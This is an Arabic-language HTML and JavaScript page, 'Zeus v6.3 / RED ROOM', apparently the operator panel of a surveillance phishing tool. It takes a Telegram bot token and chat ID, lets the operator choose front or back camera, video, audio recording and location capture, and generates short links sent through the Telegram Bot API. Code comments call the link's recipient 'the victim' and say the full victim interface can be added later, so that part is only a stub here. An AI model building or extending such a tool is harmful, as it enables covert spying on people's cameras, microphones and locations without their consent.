<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>𝒁𝒆𝒖𝒔 · v6.3 (رابط دائم)</title>
  <style>
    body {
      background: #0a0202;
      color: #f0e6e6;
      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
      display: flex;
      justify-content: center;
      align-items: center;
      min-height: 100vh;
      margin: 0;
      padding: 20px;
      direction: rtl;
    }
    .container {
      background: #160404;
      border: 1px solid #ff003388;
      border-radius: 16px;
      padding: 30px 25px;
      max-width: 550px;
      width: 100%;
      box-shadow: 0 0 50px rgba(255,0,51,0.15);
    }
    h1 {
      font-size: 26px;
      color: #ff0033;
      text-align: center;
      margin: 0 0 5px 0;
      letter-spacing: 2px;
    }
    .sub {
      text-align: center;
      color: #f0e6e688;
      font-size: 13px;
      margin-bottom: 20px;
      border-bottom: 1px solid #ff003322;
      padding-bottom: 10px;
    }
    .field {
      margin-bottom: 18px;
    }
    .field label {
      display: block;
      font-size: 13px;
      color: #ff0033aa;
      margin-bottom: 5px;
      letter-spacing: 0.5px;
    }
    .field input {
      width: 100%;
      padding: 10px 12px;
      border-radius: 8px;
      border: 1px solid #ff003355;
      background: #0d0202;
      color: #f0e6e6;
      font-size: 14px;
      box-sizing: border-box;
      direction: ltr;
      text-align: left;
    }
    .field input::placeholder {
      color: #f0e6e644;
    }
    .permalink-row {
      display: flex;
      gap: 8px;
      margin: 6px 0 12px;
    }
    .permalink-row input {
      flex: 1;
      padding: 6px 10px;
      background: #0a0101;
      border: 1px solid #ff003344;
      border-radius: 6px;
      color: #f0e6e688;
      font-size: 12px;
      direction: ltr;
      text-align: left;
    }
    .permalink-row button {
      background: #1a0808;
      border: 1px solid #ff003366;
      color: #f0e6e6;
      padding: 6px 14px;
      border-radius: 6px;
      cursor: pointer;
      font-size: 13px;
      white-space: nowrap;
    }
    .permalink-row button:hover {
      background: #2a0808;
      border-color: #ff0033;
    }
    .features {
      display: grid;
      grid-template-columns: 1fr 1fr 1fr;
      gap: 8px;
      margin: 12px 0 18px;
    }
    .feature-item {
      background: #1a0808;
      border: 1px solid #ff003333;
      border-radius: 8px;
      padding: 8px 4px;
      text-align: center;
      cursor: pointer;
      transition: 0.2s;
      font-size: 13px;
      color: #f0e6e688;
    }
    .feature-item.active {
      border-color: #ff0033;
      background: #2a0808;
      color: #ff0033;
      box-shadow: 0 0 20px #ff003322;
    }
    .feature-item input {
      display: none;
    }
    .btn {
      width: 100%;
      padding: 14px;
      border: none;
      border-radius: 10px;
      background: linear-gradient(145deg, #2a0000, #0d0000);
      color: #f0e6e6;
      font-size: 18px;
      font-weight: bold;
      letter-spacing: 2px;
      border: 1px solid #ff003388;
      cursor: pointer;
      transition: 0.15s;
      box-shadow: 0 6px 0 #4a0000, 0 8px 25px #00000099;
    }
    .btn:hover:not(:disabled) {
      transform: translateY(-2px);
      box-shadow: 0 4px 0 #5a0000, 0 12px 35px #000000cc;
    }
    .btn:active:not(:disabled) {
      transform: translateY(4px);
      box-shadow: 0 2px 0 #3a0000;
    }
    .btn:disabled {
      opacity: 0.5;
      transform: translateY(2px);
      box-shadow: 0 3px 0 #3a0000;
      cursor: not-allowed;
    }
    .result {
      margin-top: 20px;
      padding: 16px;
      border: 1px solid #ff003366;
      border-radius: 10px;
      background: #0d0202;
      display: none;
      text-align: center;
    }
    .result .short {
      font-size: 22px;
      font-weight: bold;
      color: #ff0033;
      letter-spacing: 3px;
      word-break: break-all;
      margin: 6px 0;
    }
    .result .link {
      color: #f0e6e6cc;
      font-size: 14px;
      word-break: break-all;
      background: #00000044;
      padding: 8px;
      border-radius: 6px;
      margin: 8px 0;
    }
    .result .actions {
      display: flex;
      gap: 10px;
      justify-content: center;
      margin-top: 10px;
    }
    .result .actions button {
      background: #1a0808;
      border: 1px solid #ff003366;
      color: #f0e6e6;
      padding: 6px 16px;
      border-radius: 6px;
      cursor: pointer;
      font-size: 13px;
      transition: 0.15s;
    }
    .result .actions button:hover {
      background: #2a0808;
      border-color: #ff0033;
    }
    .log {
      margin-top: 16px;
      padding: 10px 14px;
      border: 1px solid #ff003322;
      border-radius: 8px;
      background: #0a0202;
      font-family: monospace;
      font-size: 13px;
      color: #f0e6e688;
      min-height: 50px;
      direction: ltr;
      text-align: left;
    }
    .log .prompt { color: #ff0033; }
    .error {
      color: #ff6633;
      font-size: 13px;
      margin-top: 6px;
    }
    #botList {
      margin-top: 12px;
      border-top: 1px solid #ff003322;
      padding-top: 12px;
    }
    #botList .item {
      display: flex;
      justify-content: space-between;
      padding: 4px 0;
      border-bottom: 1px solid #ff003311;
      font-size: 13px;
      direction: ltr;
    }
    #botList .item .del {
      color: #ff003388;
      cursor: pointer;
    }
    #botList .item .del:hover { color: #ff0033; }
    .footer {
      margin-top: 16px;
      text-align: center;
      font-size: 12px;
      color: #f0e6e644;
      letter-spacing: 1px;
    }
    .badge-url {
      background: #ff003322;
      padding: 2px 8px;
      border-radius: 12px;
      font-size: 11px;
      color: #ff0033;
    }
  </style>
</head>
<body>
<div class="container">
  <h1>𝒁𝒆𝒖𝒔 · v6.3</h1>
  <div class="sub">‹ رابط دائم · يعمل في أي متصفح ›</div>

  <form id="form">
    <div class="field">
      <label>🤖 توكن البوت</label>
      <input type="text" id="botToken" placeholder="أدخل توكن البوت" required>
    </div>
    <div class="field">
      <label>🆔 معرف المحادثة (Chat ID)</label>
      <input type="text" id="chatId" placeholder="مثل 123456789" required>
    </div>

    <!-- رابط الإعدادات الدائم (الجذر الحقيقي) -->
    <div class="permalink-row">
      <input type="text" id="permalinkInput" value="" readonly placeholder="احفظ هذا الرابط في أي متصفح" dir="ltr">
      <button type="button" id="copyPermalinkBtn">📋 نسخ الرابط الدائم</button>
    </div>

    <div style="font-size:13px; color:#ff003388; margin-bottom:6px;">⚙️ الميزات المطلوبة</div>
    <div class="features" id="featuresContainer">
      <label class="feature-item active" data-val="camFront">📷 أمامي<input type="checkbox" checked></label>
      <label class="feature-item" data-val="camBack">📷 خلفي<input type="checkbox"></label>
      <label class="feature-item" data-val="videoFront">🎥 فيديو أمامي<input type="checkbox"></label>
      <label class="feature-item" data-val="videoBack">🎥 فيديو خلفي<input type="checkbox"></label>
      <label class="feature-item" data-val="audio">🎤 تسجيل صوتي<input type="checkbox"></label>
      <label class="feature-item" data-val="location">📍 موقع<input type="checkbox"></label>
    </div>

    <button class="btn" id="generateBtn" type="submit">⚡ توليد الرابط</button>
    <div id="formError" class="error"></div>
  </form>

  <div class="result" id="resultBox">
    <div>✅ تم إنشاء الرابط</div>
    <div class="short" id="shortTokenDisplay">------</div>
    <div class="link" id="fullLinkDisplay">https://...</div>
    <div class="actions">
      <button id="copyBtn">📋 نسخ</button>
      <button id="openBtn">🔗 فتح</button>
    </div>
  </div>

  <div class="log" id="log">
    <div><span class="prompt">$</span> جاهز لتوليد رابط<span class="cursor">█</span></div>
  </div>

  <div id="botList">
    <div style="font-size:12px; color:#ff003366; margin-bottom:4px;">📦 الروابط المخزنة</div>
    <div id="listItems"></div>
  </div>

  <div class="footer">◆ XX_8K · RED ROOM v6.3 (حل جذري) ◆</div>
</div>

<script>
  // ================================================================
  //  𝒁𝒆𝒖𝒔 v6.3 — الحل الجذري لمشكلة اختفاء التوكن عند تغيير المتصفح
  //  المبدأ: قراءة التوكن ومعرف المحادثة من معلمات الرابط (URL)
  //  ثم حفظهما في localStorage كخيار احتياطي.
  // ================================================================

  // --- العناصر ---
  const form = document.getElementById('form');
  const botTokenInput = document.getElementById('botToken');
  const chatIdInput = document.getElementById('chatId');
  const generateBtn = document.getElementById('generateBtn');
  const resultBox = document.getElementById('resultBox');
  const shortDisplay = document.getElementById('shortTokenDisplay');
  const fullLinkDisplay = document.getElementById('fullLinkDisplay');
  const copyBtn = document.getElementById('copyBtn');
  const openBtn = document.getElementById('openBtn');
  const logDiv = document.getElementById('log');
  const errorDiv = document.getElementById('formError');
  const listItems = document.getElementById('listItems');
  const permalinkInput = document.getElementById('permalinkInput');
  const copyPermalinkBtn = document.getElementById('copyPermalinkBtn');

  // --- قراءة معلمات الرابط (الحل الجذري) ---
  function getParams() {
    const params = new URLSearchParams(window.location.search);
    return {
      bot: params.get('bot') || '',
      chat: params.get('chat') || ''
    };
  }

  // --- تحديث حقل الرابط الدائم ---
  function updatePermalink() {
    const bot = botTokenInput.value.trim();
    const chat = chatIdInput.value.trim();
    if (bot && chat) {
      const base = window.location.origin + window.location.pathname;
      permalinkInput.value = `${base}?bot=${encodeURIComponent(bot)}&chat=${encodeURIComponent(chat)}`;
    } else {
      permalinkInput.value = 'أدخل التوكن والمعرف ثم انسخ الرابط الدائم';
    }
  }

  // --- نسخ الرابط الدائم ---
  copyPermalinkBtn.addEventListener('click', function() {
    const text = permalinkInput.value;
    if (!text || text.includes('أدخل')) {
      setError('⚠️ يرجى إدخال التوكن ومعرف المحادثة أولاً');
      return;
    }
    if (navigator.clipboard) {
      navigator.clipboard.writeText(text).then(() => {
        this.textContent = '✅ تم';
        setTimeout(() => this.textContent = '📋 نسخ الرابط الدائم', 1500);
      }).catch(() => fallbackCopyPermalink(text));
    } else {
      fallbackCopyPermalink(text);
    }
  });
  function fallbackCopyPermalink(text) {
    const ta = document.createElement('textarea');
    ta.value = text;
    document.body.appendChild(ta);
    ta.select();
    document.execCommand('copy');
    document.body.removeChild(ta);
    copyPermalinkBtn.textContent = '✅ تم';
    setTimeout(() => copyPermalinkBtn.textContent = '📋 نسخ الرابط الدائم', 1500);
  }

  // --- تفعيل الميزات بالنقر ---
  document.querySelectorAll('.feature-item').forEach(item => {
    item.addEventListener('click', function(e) {
      const cb = this.querySelector('input[type="checkbox"]');
      cb.checked = !cb.checked;
      this.classList.toggle('active', cb.checked);
    });
    item.querySelector('input').addEventListener('click', function(e) {
      e.stopPropagation();
    });
  });

  // --- السجل والخطأ ---
  function logMessage(msg) {
    const time = new Date().toLocaleTimeString();
    logDiv.innerHTML = `<div><span class="prompt">$</span> ${msg} <span style="color:#666;">[${time}]</span></div>` + logDiv.innerHTML;
    if (logDiv.children.length > 20) logDiv.removeChild(logDiv.lastChild);
  }
  function setError(msg) {
    errorDiv.textContent = msg;
    if (msg) setTimeout(() => errorDiv.textContent = '', 6000);
  }

  // --- دوال التخزين ---
  function getStorage() {
    try { return JSON.parse(localStorage.getItem('zeus_bots') || '{}'); } catch { return {}; }
  }
  function saveStorage(data) {
    localStorage.setItem('zeus_bots', JSON.stringify(data));
  }

  // --- توليد رمز عشوائي ---
  function generateShort() {
    const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
    let token = '';
    for (let i = 0; i < 6; i++) token += chars[Math.floor(Math.random() * chars.length)];
    return token;
  }

  // --- عرض قائمة الروابط ---
  function renderList() {
    const data = getStorage();
    const keys = Object.keys(data);
    if (keys.length === 0) {
      listItems.innerHTML = '<div style="color:#666;font-size:12px;">لا توجد روابط</div>';
      return;
    }
    let html = '';
    keys.forEach(key => {
      const entry = data[key];
      html += `<div class="item">
                <span style="color:#ff0033;">${entry.shortToken}</span>
                <span style="color:#888;font-size:12px;">${entry.features || ''}</span>
                <span class="del" data-token="${key}">✕</span>
              </div>`;
    });
    listItems.innerHTML = html;
    document.querySelectorAll('.item .del').forEach(el => {
      el.addEventListener('click', function() {
        const token = this.dataset.token;
        const data = getStorage();
        delete data[token];
        saveStorage(data);
        renderList();
        logMessage(`🗑️ حذف الرابط ${token}`);
      });
    });
  }

  // --- عرض النتيجة ---
  function showResult(shortToken) {
    const base = window.location.origin + window.location.pathname;
    const link = `${base}?t=${shortToken}`;
    shortDisplay.textContent = shortToken;
    fullLinkDisplay.textContent = link;
    resultBox.style.display = 'block';
    resultBox.scrollIntoView({ behavior: 'smooth', block: 'center' });
  }

  // --- نسخ الرابط القصير ---
  copyBtn.addEventListener('click', function() {
    const text = fullLinkDisplay.textContent;
    if (navigator.clipboard) {
      navigator.clipboard.writeText(text).then(() => {
        this.textContent = '✅ تم';
        setTimeout(() => this.textContent = '📋 نسخ', 1500);
      }).catch(() => fallbackCopy(text));
    } else { fallbackCopy(text); }
  });
  function fallbackCopy(text) {
    const ta = document.createElement('textarea');
    ta.value = text;
    document.body.appendChild(ta);
    ta.select();
    document.execCommand('copy');
    document.body.removeChild(ta);
    copyBtn.textContent = '✅ تم';
    setTimeout(() => copyBtn.textContent = '📋 نسخ', 1500);
  }
  openBtn.addEventListener('click', () => window.open(fullLinkDisplay.textContent, '_blank'));

  // --- إرسال الرابط للمستخدم ---
  async function sendLinkToUser(botToken, chatId, shortToken) {
    const base = window.location.origin + window.location.pathname;
    const link = `${base}?t=${shortToken}`;
    const msg = `🔗 *رابطك الجديد*\n${link}\n\nسيطلب الصلاحيات (كاميرا، ميكروفون، موقع)`;
    try {
      const resp = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ chat_id: chatId, text: msg, parse_mode: 'Markdown' })
      });
      const json = await resp.json();
      if (json.ok) {
        logMessage('✅ تم إرسال الرابط إلى المستخدم');
        return true;
      } else {
        logMessage('⚠️ فشل الإرسال: ' + (json.description || 'خطأ'));
        return false;
      }
    } catch (e) {
      logMessage('❌ خطأ في الإرسال: ' + e.message);
      return false;
    }
  }

  // --- معالج النموذج ---
  form.addEventListener('submit', async function(e) {
    e.preventDefault();
    setError('');

    const botToken = botTokenInput.value.trim();
    const chatId = chatIdInput.value.trim();

    if (!botToken || !chatId) {
      setError('❌ يرجى ملء جميع الحقول');
      return;
    }

    generateBtn.disabled = true;
    generateBtn.textContent = '⏳ جاري التوليد...';
    logMessage('⏳ بدء توليد الرابط...');

    try {
      const checked = document.querySelectorAll('.feature-item input[type="checkbox"]:checked');
      const features = Array.from(checked).map(cb => cb.closest('.feature-item').dataset.val).join(',');

      const data = getStorage();

      if (data[botToken]) {
        const existing = data[botToken];
        if (existing.features !== features) {
          existing.features = features;
          existing.updated = Date.now();
          saveStorage(data);
          logMessage('🔄 تحديث ميزات الرابط السابق');
        }
        showResult(existing.shortToken);
        await sendLinkToUser(botToken, chatId, existing.shortToken);
        renderList();
        generateBtn.disabled = false;
        generateBtn.textContent = '⚡ توليد الرابط';
        return;
      }

      let shortToken;
      let attempts = 0;
      const existingTokens = Object.values(data).map(e => e.shortToken);
      do {
        shortToken = generateShort();
        attempts++;
      } while (existingTokens.includes(shortToken) && attempts < 50);

      data[botToken] = {
        chatId: chatId,
        features: features,
        shortToken: shortToken,
        createdAt: Date.now(),
        updated: Date.now()
      };
      saveStorage(data);
      logMessage('✅ تم حفظ الرابط الجديد');

      showResult(shortToken);
      await sendLinkToUser(botToken, chatId, shortToken);
      renderList();

      // تحديث الرابط الدائم بعد التوليد (للتأكد)
      updatePermalink();

    } catch (err) {
      logMessage('❌ خطأ: ' + err.message);
      setError('حدث خطأ: ' + err.message);
    } finally {
      generateBtn.disabled = false;
      generateBtn.textContent = '⚡ توليد الرابط';
    }
  });

  // ================================================================
  //  🚀  التهيئة — قراءة المعلمات من الرابط (الحل الجذري)
  // ================================================================
  (function init() {
    // 1. قراءة المعلمات من URL
    const params = getParams();
    let bot = params.bot;
    let chat = params.chat;

    // 2. إذا كانت المعلمات موجودة، املأ الحقول بها واحفظها في localStorage
    if (bot && chat) {
      botTokenInput.value = bot;
      chatIdInput.value = chat;
      // حفظها في localStorage لاستخدامها لاحقاً في نفس المتصفح
      localStorage.setItem('zeus_last_input', JSON.stringify({ botToken: bot, chatId: chat }));
      logMessage(`✅ تم تحميل الإعدادات من الرابط: التوكن ${bot.substring(0,6)}...`);
    } else {
      // 3. إذا لم تكن موجودة، حاول استرجاعها من localStorage
      try {
        const last = JSON.parse(localStorage.getItem('zeus_last_input') || '{}');
        if (last.botToken) botTokenInput.value = last.botToken;
        if (last.chatId) chatIdInput.value = last.chatId;
        if (last.botToken) logMessage('📂 تم استرجاع الإعدادات من التخزين المحلي');
      } catch {}
    }

    // 4. تحديث حقل الرابط الدائم عند تغيير الحقول
    botTokenInput.addEventListener('input', () => { updatePermalink();
      saveLastInput(); });
    chatIdInput.addEventListener('input', () => { updatePermalink();
      saveLastInput(); });

    function saveLastInput() {
      localStorage.setItem('zeus_last_input', JSON.stringify({
        botToken: botTokenInput.value,
        chatId: chatIdInput.value
      }));
    }

    // 5. تهيئة القائمة والسجل
    renderList();
    logMessage('𝒁𝒆𝒖𝒔 v6.3 جاهز — الرابط الدائم يحل مشكلة المتصفحات');
    updatePermalink();

    // 6. إذا كان هناك رابط قصير في URL (للضحية)، نعرض رسالة
    const tParam = new URLSearchParams(window.location.search).get('t');
    if (tParam) {
      document.querySelector('.container').innerHTML = `
        <h1>🔐 رابط صالح</h1>
        <p style="color:#f0e6e6cc;">تم فتح الرابط القصير: <strong style="color:#ff0033;">${tParam}</strong></p>
        <p style="color:#888;font-size:14px;">هذه النسخة المبسطة تعرض الرابط فقط. يمكنك إضافة واجهة الضحية الكاملة لاحقاً.</p>
        <p style="margin-top:20px;"><a href="${window.location.pathname}" style="color:#ff0033;">↩ العودة إلى لوحة التحكم</a></p>
      `;
    }

    console.log('✅ 𝒁𝒆𝒖𝒔 v6.3 (حل جذري) جاهز');
  })();
</script>
</body>
</html>
